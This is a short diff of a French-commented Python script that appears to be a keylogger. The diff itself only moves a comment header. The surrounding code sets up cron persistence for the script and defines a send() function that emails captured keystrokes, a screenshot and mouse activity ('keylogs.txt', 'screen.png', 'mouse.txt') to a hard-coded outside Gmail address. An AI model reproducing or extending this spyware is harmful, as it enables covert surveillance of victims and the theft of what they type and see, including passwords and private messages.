@@ -15,16 +15,15 @@ own_file=os.path.basename(__file__)
 setupCron.setupCron(own_file)
 
 #--------FIN TÂCHES PROGRAMMÉES----------------
+
+#--------DÉBUT PARTIE ENVOI MAIL----------------
+
 def send():
     sendMail.send_mail(receiver_email="oussamaau123@gmail.com",
                            subject="Fichier du keylog",
                            body="Envoi du fichier keylog",
                            attachments=["keylogs.txt","screen.png", "mouse.txt"]
                        )
-
-#--------DÉBUT PARTIE ENVOI MAIL----------------
-
-
 
 #--------FIN PARTIE ENVOI MAIL------------------
 
